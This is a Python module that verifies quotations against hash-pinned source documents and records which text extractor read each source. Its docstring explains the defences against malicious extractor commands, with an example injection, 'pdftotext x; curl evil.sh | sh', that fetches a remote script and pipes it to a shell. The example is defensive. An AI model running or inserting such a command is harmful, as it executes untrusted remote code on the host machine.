"""Does each quotation appear in the source it cites?

Builds a corpus of quotations checked against a pinned source, so later work quotes from the
corpus rather than from memory.

Three orthogonal things, kept apart.

The pin -- is this the document that was pinned? Checked once per artifact:

    ok           the file's sha256 matches the one recorded
    broken       the file has changed since the quotations were taken
    unpinned     no sha256 was recorded, so nothing can be checked
    missing      the file named by the record is not on disk

The result -- did the passage appear? Exhaustive, three outcomes:

    found        the passage is in the source
    not found    the source was read and the passage is not in it
    unchecked    the source could not be read, so no measurement was made

The warnings -- is the quote well formed? A quote can be `found` and still carry one:

    short        the source may qualify it in the next clause
    truncated    every occurrence stops mid-word or mid-number
    normalized   matched only after ignoring punctuation and spacing
    page         found, but not on the page the record claims

The extractor -- what turned the source into text? Recorded on every result, with a digest of
what it produced. A pin says the bytes did not change and says nothing about how they were
read: two extractors over one PDF produce two texts and one pin, so a decision that does not
name the program behind it cannot be compared with a later one. A source declaring
`extract_cmd` is read by the command it names, a `TEXT_SUFFIXES` source straight off disk, and
everything else by `pdftotext -layout`.

`unchecked` means read the source. A mirror-reversed scan or a broken extraction produces the
same signal as a passage that was never there -- so an extraction that failed for an
infrastructure reason says which one, rather than reporting the document as unreadable.

Running a declared `extract_cmd`
--------------------------------

The command a claims file declares runs on the machine doing the checking. The case that
decides the rules is not an author running their own file: it is `citations verify` in
continuous integration on a pull request from a fork, where the contributor wrote the claims
file and the command executes on the maintainer's runner with the runner's environment and
credentials in reach. Two measures bound that, and neither is a sanitizer:

    no shell     the declared string is split into a program and arguments and executed
                 directly. `pdftotext x; curl evil.sh | sh` is not filtered out, it cannot be
                 expressed -- the `;` and the `|` reach pdftotext as literal arguments.
    an allowlist only `DEFAULT_EXTRACTORS` runs unasked. Anything else needs
                 `--allow-extractor NAME`, written by whoever runs the check rather than by
                 whoever wrote the claims file.

A refused command is `unchecked` and says it was refused; a command that is not installed is
`unchecked` and says that instead. The remedy for one is consent and for the other an install,
and neither makes the passage absent.

The allowlist bounds which program runs and not what an allowed program can be told to do, so
a program that loads and runs code named on its own command line stays out of the default set.
`pandoc --lua-filter` and `mutool run` are both arbitrary execution, and reaching either is a
deliberate act with the consequence in view.
"""

from __future__ import annotations

import functools
import hashlib
import pathlib
import re
import shlex
import subprocess
import unicodedata
from dataclasses import dataclass, field
from typing import Literal

from provenance_core import sha256_of_file

from citations.exceptions import SourceUnreadableError

# Long enough to carry its own qualifiers. "We trained 50" resolves against a sentence that
# continues "...and 5 refits each for 12 layered".
MIN_QUOTE_CHARS = 40

#: How many pages `_find_page` will scan before giving up. Hitting it is reported, never
#: silently folded into "not found on any page" -- the two are different facts.
PAGE_SCAN_LIMIT = 200

#: Suffixes read directly rather than through a PDF extractor. Running `pdftotext` over these
#: returns nothing, which would read as an unreadable source.
TEXT_SUFFIXES = (".txt", ".md", ".tei", ".xml", ".html", ".htm", ".rst")

#: Recorded as the extractor for a source read straight off disk. Naming a program there would
#: claim one ran.
PLAIN_TEXT = "text"

#: What reads a source that declares no `extract_cmd` and is not plain text.
DEFAULT_EXTRACTOR = "pdftotext -layout"

#: How long any extractor gets before the source is reported unreadable rather than waited on.
EXTRACT_TIMEOUT = 120

#: Programs an `extract_cmd` may name with no further consent. Each reads a file and prints
#: text, and neither can be told on its own command line to load and run code. Matched against
#: the program as written, so `pdftotext` is allowed and `./pdftotext` is not: a bare name
#: resolves through PATH, which the machine running the check controls and a claims file
#: arriving from elsewhere does not.
DEFAULT_EXTRACTORS = frozenset({"pdftotext", "detex"})

State = Literal["found", "not found", "unchecked"]
PinState = Literal["ok", "broken", "unpinned", "missing"]


@dataclass
class Result:
    """`state` is the measurement; `warnings` are notes about the quote itself."""

    state: State
    detail: str = ""  # why, when unchecked or not found
    warnings: list[str] = field(default_factory=list)
    page_found: int | None = None

    extractor: str = ""
    """What turned the source into text: the declared `extract_cmd`, `pdftotext -layout`, or
    `text` for a source read straight off disk. Empty where nothing was read, so a decision
    resting on an extractor stays distinguishable from one that rests on none."""

    extraction_digest: str = ""
    """sha256 of the text the extractor produced. The artifact's pin establishes that the
    bytes did not change; this establishes that the reading of them did not, which a pin
    cannot -- two extractors over one PDF produce two texts under one pin."""


@dataclass
class Pin:
    """Whether the artifact on disk is the artifact the record describes.

    Separate from `Result` because it is a fact about the source, not about any one quotation.
    A broken pin does not make a quotation `not found` -- the passage may well be in the file
    that is there -- but it does mean every result computed against it describes a document
    the record does not.
    """

    state: PinState
    expected: str = ""
    actual: str = ""

    @property
    def ok(self) -> bool:
        return self.state == "ok"


@dataclass
class Report:
    checked: int = 0
    counts: dict[str, int] = field(default_factory=dict)
    problems: list[tuple[str, str, Result]] = field(default_factory=list)
    broken_pins: list[tuple[str, Pin]] = field(default_factory=list)
    unpinned: list[str] = field(default_factory=list)
    """Sources with no recorded digest. Their quotations resolve against whatever is on disk."""
    skipped: list[tuple[str, str]] = field(default_factory=list)
    """Claims files that would not parse, so their quotations were never examined."""
    extractors: dict[str, int] = field(default_factory=dict)
    """How many quotations each extractor answered. A report that does not say what read its
    sources cannot be compared with one taken where a different renderer was declared."""

    @property
    def unresolved(self) -> int:
        """Quotations no verdict was reached on."""
        return self.counts.get("unchecked", 0)

    @property
    def strict_ok(self) -> bool:
        """What `--strict` means: nothing was left unresolved.

        `ok` is the substantive verdict -- a quotation that is genuinely absent. It
        deliberately ignores an unchecked quote, because a missing extractor says nothing
        about the paper. For CI that is the wrong question: a deleted source, an unpinned
        one, a claims file that would not parse, and a missing `pdftotext` all left a build
        green while nothing had been verified at all.
        """
        return self.ok and not self.unresolved and not self.unpinned and not self.skipped

    @property
    def ok(self) -> bool:
        """Only `not found` and a broken pin are failures. Unchecked is neither.

        A run that measured nothing is not a pass, decided here so no caller can report
        success on an empty run.
        """
        if self.checked == 0:
            return False
        if self.broken_pins:
            return False
        return not any(r.state == "not found" for _, _, r in self.problems)


@functools.lru_cache(maxsize=256)
def fold(s: str) -> str:
    """Normalize the way a PDF extractor mangles text, without changing which words appear."""
    s = unicodedata.normalize("NFKC", s)
    # A PDF's embedded fonts can reach the extractor as raw glyph codes, arriving as control
    # characters mid-page. They become separators rather than being deleted: deleting them welds
    # the words on either side into one that appears in neither text, so a passage that is really
    # there stops resolving. `logit\x00difference` deleted is `logitdifference`, which no honest
    # quotation of it can match.
    s = re.sub(r"[\x00-\x08\x0b\x0e-\x1f\x7f]", " ", s)
    s = s.replace("’", "'").replace("‘", "'")
    s = s.replace("“", '"').replace("”", '"')
    s = s.replace("—", "-").replace("–", "-").replace("−", "-")
    s = re.sub(r"-\s*\n\s*", "", s)  # de-hyphenate across a line break
    return " ".join(s.split()).lower()


@functools.lru_cache(maxsize=256)
def skeleton(s: str) -> str:
    """`fold`, with whitespace removed. Nothing else.

    This is the fallback used when a verbatim match fails, so it is only ever applied to a
    passage that is provably not in the source as written. It must therefore absorb exactly
    what a PDF extractor mangles and nothing more.

    Extractors insert and drop spaces inside words -- `logit difference` comes out as
    `logitdifference` -- so whitespace is removed. They do not turn `=` into `<`, delete a
    minus sign, or drop a decimal point. An earlier version stripped every non-alphanumeric
    character, which made `p < 0.05` match a source reading `p = 0.05`, and `-0.42` match
    `0.42`: a reversed inequality and a flipped sign both reported as quoted verbatim, by the
    one check that exists to catch a misquotation.
    """
    return re.sub(r"\s+", "", fold(s))


def _argv(source: pathlib.Path, declared: str, allowed: frozenset[str]) -> list[str]:
    """A declared `extract_cmd` as argv, with the source path substituted in.

    `{}` is replaced by the path wherever it appears, and a command carrying no `{}` gets the
    path appended, so `detex` and `pdftotext -layout {} -` both name a working extractor.

    Refuses a command that will not parse into a program and arguments, and one naming a
    program this run was not told to allow. Both raise `SourceUnreadableError`, so both reach
    the report as `unchecked` with the reason: nothing was read, and the passage is not
    thereby absent. The module docstring says why the check is an allowlist over argv rather
    than a filter over a string.
    """
    try:
        parts = shlex.split(declared)
    except ValueError as e:
        raise SourceUnreadableError(source, f"extract_cmd will not parse as a command: {e}") from e
    if not parts:
        raise SourceUnreadableError(source, "extract_cmd is empty")
    if parts[0] not in allowed:
        raise SourceUnreadableError(
            source,
            f"extract_cmd names {parts[0]!r}, which this run does not allow -- "
            f"pass --allow-extractor {parts[0]} to run it",
        )
    if any("{}" in part for part in parts):
        return [part.replace("{}", str(source)) for part in parts]
    return [*parts, str(source)]


def _run(source: pathlib.Path, argv: list[str], missing: str = "", hint: str = "") -> str:
    """Run one extractor over `source` and return what it printed.

    Never through a shell: `subprocess.run` is handed a list, so a metacharacter in a declared
    command is an argument to the program rather than an operator interpreted before it.

    Every way the toolchain can fail raises `SourceUnreadableError` naming which way, rather
    than returning empty text. An empty return means the document holds no extractable text,
    which is a fact about the document and carries a different message.
    """
    program = argv[0]
    try:
        proc = subprocess.run(argv, capture_output=True, text=True, timeout=EXTRACT_TIMEOUT)
    except FileNotFoundError as e:
        raise SourceUnreadableError(source, (missing or f"{program} is not on PATH") + hint) from e
    except subprocess.TimeoutExpired as e:
        raise SourceUnreadableError(source, f"{program} timed out after {EXTRACT_TIMEOUT}s") from e
    except OSError as e:
        raise SourceUnreadableError(source, f"{program} could not be run: {e}") from e
    if proc.returncode != 0:
        said = (proc.stderr or "").strip().splitlines()
        raise SourceUnreadableError(
            source,
            f"{program} exited {proc.returncode}" + (f": {said[-1]}" if said else "") + hint,
        )
    return proc.stdout


@functools.lru_cache(maxsize=64)
def extract(
    pdf: pathlib.Path,
    page: int | None = None,
    extract_cmd: str | None = None,
    allowed: frozenset[str] = DEFAULT_EXTRACTORS,
) -> str:
    """Text of a source. Cached, so N quotes against one file is one extraction.

    A declared `extract_cmd` takes precedence over both other paths, including reading a
    `TEXT_SUFFIXES` file directly: an author names a renderer because the bytes on disk are
    not the text they quote. It renders the whole document at once, so `page` does not reach
    it, and `allowed` decides which programs this run will run.

    Raises `SourceUnreadableError` when the extraction toolchain is at fault -- a missing or
    refused command, a timeout, a permission error -- rather than returning empty text. An
    empty return means the document genuinely holds no extractable text on that page, which is
    a different fact and gets a different message.
    """
    if extract_cmd:
        return _run(pdf, _argv(pdf, extract_cmd, allowed))
    if pdf.suffix.lower() in TEXT_SUFFIXES:
        try:
            return pdf.read_text(errors="replace")
        except OSError as e:
            raise SourceUnreadableError(pdf, f"could not be read: {e}") from e

    cmd = ["pdftotext", "-layout"]
    if page:
        cmd += ["-f", str(page), "-l", str(page)]
    cmd += [str(pdf), "-"]
    # A `.tex` handed to a PDF reader answers `Syntax Error: Couldn't read xref table`, which
    # reads as a damaged document rather than as the wrong tool pointed at an intact one.
    hint = (
        ""
        if pdf.suffix.lower() in ("", ".pdf")
        else f"  ({pdf.suffix} is not a PDF: declare extract_cmd to name the renderer)"
    )
    return _run(pdf, cmd, "pdftotext is not on PATH -- install poppler-utils", hint)


@functools.lru_cache(maxsize=64)
def _digest(text: str) -> str:
    """sha256 of what an extractor produced, recorded beside the extractor that produced it."""
    return hashlib.sha256(text.encode()).hexdigest()


def _extractor_name(artifact: pathlib.Path, extract_cmd: str | None) -> str:
    """What `extract` reads this source with, as the report names it."""
    if extract_cmd:
        return " ".join(extract_cmd.split())
    return PLAIN_TEXT if artifact.suffix.lower() in TEXT_SUFFIXES else DEFAULT_EXTRACTOR


@functools.lru_cache(maxsize=256)
def sha256(p: pathlib.Path) -> str:
    """Hash of a file on disk. The implementation is shared; this keeps the local name."""
    return sha256_of_file(p)


def check_pin(artifact: pathlib.Path | None, expected: str | None) -> Pin:
    """Is the file on disk the file that was pinned?

    An unpinned source is reported as `unpinned`, never as `ok`: no hash was recorded, so
    nothing was checked, and saying otherwise would claim a guarantee the record does not make.
    """
    if artifact is None or not artifact.exists():
        return Pin("missing")
    if not (expected and expected.strip()):
        return Pin("unpinned")
    try:
        actual = sha256(artifact)
    except OSError:
        return Pin("missing")
    expected = expected.strip().lower()
    return Pin("ok" if actual == expected else "broken", expected, actual)


def check_one(
    quote: str,
    artifact: pathlib.Path | None,
    page: int | None = None,
    extract_cmd: str | None = None,
    allowed: frozenset[str] = DEFAULT_EXTRACTORS,
) -> Result:
    """Does this passage appear in this source, and what read the source to decide?

    `extract_cmd` is the command the claims file declares; `allowed` is the set of programs
    this run will run, which the caller decides rather than the file. A command that is
    refused, missing, failing or silent yields `unchecked` carrying the reason -- none of
    those makes the passage absent.
    """
    warn: list[str] = []
    text = quote.strip()
    if len(text) < MIN_QUOTE_CHARS or text.endswith(
        (",", " and", " or", " but", " the", " a", " of", " for", " with")
    ):
        warn.append("short")

    if artifact is None or not artifact.exists():
        return Result("unchecked", "file not found", warn)

    # Called with the arguments it has always taken where nothing is declared. `extract` is
    # exported, and a caller that wraps or substitutes it wrote against the two-argument shape;
    # a source with no `extract_cmd` must not start reaching them for a new one.
    try:
        full = extract(artifact, None, extract_cmd, allowed) if extract_cmd else extract(artifact)
    except SourceUnreadableError as e:
        return Result("unchecked", e.detail, warn)
    if not full.strip():
        return Result("unchecked", "no text extracted", warn)

    # A declared extractor renders the whole document at once, so there is no page to ask it
    # about: the position a `.txt` source is already in. Asking `pdftotext` for the page
    # instead would run a PDF reader over a source whose author said it is not one.
    paginated = extract_cmd is None and is_paginated(artifact)
    result = _verdict(quote, full, artifact, page if paginated else None, warn)
    result.extractor = _extractor_name(artifact, extract_cmd)
    result.extraction_digest = _digest(full)
    return result


def _verdict(
    quote: str, full: str, artifact: pathlib.Path, page: int | None, warn: list[str]
) -> Result:
    """The verdict on one passage, against the text an extractor produced."""
    q, doc = fold(quote), fold(full)
    if not q:
        # `"" in doc` is True. A quotation that folds away entirely is not a quotation.
        return Result("not found", "the quotation is empty after normalization", warn)
    if q in doc:
        if _cuts_a_token(q, doc):
            warn.append("truncated")
        if page and not _on_page(artifact, q, page):
            warn.append("page")
            found_at, capped = _find_page(artifact, q)
            detail = f"not on page {page}"
            if found_at is None and capped:
                detail += f"; searched the first {PAGE_SCAN_LIMIT} pages"
            return Result("found", detail, warn, found_at)
        return Result("found", "", warn)
    if skeleton(quote) and skeleton(quote) in skeleton(full):
        warn.append("normalized")
        return Result("found", "", warn)
    return Result(
        "not found",
        "read the source: a broken extraction reads the same as a passage that was never there",
        warn,
    )


def _on_page(artifact: pathlib.Path, folded_quote: str, page: int) -> bool:
    """Is the quote on the page the record claims? An unreadable page is not a match."""
    try:
        return folded_quote in fold(extract(artifact, page))
    except SourceUnreadableError:
        return False


def _cuts_a_token(q: str, doc: str) -> bool:
    """Does every occurrence of the quote stop in the middle of a word or a number?

    `"an accuracy of 0.9"` is genuinely present in a source reporting **0.95**, so it is `found`
    and the reader is told a true thing that misstates the result. The same cut turns
    `"We trained 50"` into `"We trained 5"`. This is not the `short` warning: length is not the
    problem, and a long quote ending one digit early is the more convincing version of it.

    Every occurrence must cut, because a quote that lands cleanly somewhere in the document is
    quoting that place.
    """
    if not q or not q[-1].isalnum():
        return False
    at, seen = doc.find(q), False
    while at >= 0:
        seen = True
        after = at + len(q)
        if after >= len(doc) or not doc[after].isalnum():
            return False
        at = doc.find(q, at + 1)
    return seen


def is_paginated(artifact: pathlib.Path) -> bool:
    """Whether asking which page a passage is on means anything for this source."""
    return artifact.suffix.lower() not in TEXT_SUFFIXES


def _find_page(
    artifact: pathlib.Path, folded_quote: str, limit: int = PAGE_SCAN_LIMIT
) -> tuple[int | None, bool]:
    """Which page holds the quote, and whether the scan hit its limit without deciding.

    The second element exists so a caller can tell "searched the whole document and it is not
    on any page" from "stopped searching at page N". Reporting both as `None` makes a cap look
    like a finding.

    A source with no pages answers `(None, False)` at once. Extraction ignores the page number
    there, so a scan would return the same text `limit` times and then claim it had searched
    that many pages of a document that has none.
    """
    if not is_paginated(artifact):
        return None, False
    for p in range(1, limit + 1):
        try:
            text = extract(artifact, p)
        except SourceUnreadableError:
            return None, False
        if not text:
            return None, False  # ran off the end of the document
        if folded_quote in fold(text):
            return p, False
    return None, True  # still going when the limit ran out
